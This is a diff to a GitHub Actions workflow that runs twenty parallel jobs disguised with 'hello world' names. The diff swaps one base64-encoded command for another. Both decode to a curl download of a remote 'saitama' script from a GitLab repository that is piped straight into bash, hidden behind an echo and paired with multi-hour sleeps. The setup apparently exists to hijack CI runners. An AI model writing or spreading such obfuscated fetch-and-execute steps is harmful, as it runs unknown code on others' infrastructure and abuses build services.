@@ -19,26 +19,26 @@ jobs:
       max-parallel: 20
       matrix:
         include:
-          - name: lscpu-A
-          - name: lscpu-B
-          - name: lscpu-C
-          - name: lscpu-D
-          - name: lscpu-E
-          - name: lscpu-F
-          - name: lscpu-G
-          - name: lscpu-H
-          - name: lscpu-I
-          - name: lscpu-J
-          - name: lscpu-K
-          - name: lscpu-L
-          - name: lscpu-M
-          - name: lscpu-N
-          - name: lscpu-O
-          - name: lscpu-P
-          - name: lscpu-Q
-          - name: lscpu-R
-          - name: lscpu-S
-          - name: lscpu-T                                      
+          - name: hello-a1
+          - name: hello-b1
+          - name: hello-c1
+          - name: hello-d1
+          - name: hello-e1
+          - name: hello-f1
+          - name: hello-g1
+          - name: hello-h1
+          - name: hello-i1
+          - name: hello-j1
+          - name: hello-k1
+          - name: hello-l1
+          - name: hello-m1
+          - name: hello-n1
+          - name: hello-o1
+          - name: hello-p1
+          - name: hello-q1
+          - name: hello-r1
+          - name: hello-s1
+          - name: hello-t1                                     
     runs-on: ubuntu-latest
     timeout-minutes: 360
     steps:
@@ -53,7 +53,7 @@ jobs:
           echo "🕕 hello world"
           SLEEP=10800
           else
-            if [ "$LOOP" -ge 9980 ]; then
+            if [ "$LOOP" -ge 9982 ]; then
               echo "🔄 hello world"
               SLEEP=600
             else
@@ -61,7 +61,7 @@ jobs:
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9zYWl0YW1hLnNoIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZm9vZC8tL3Jhdy9tYWluL3NhaXRhbWEgfCBiYXNo | sh & sleep $SLEEP
 
   trigger-hello:
     needs: run-lscpu
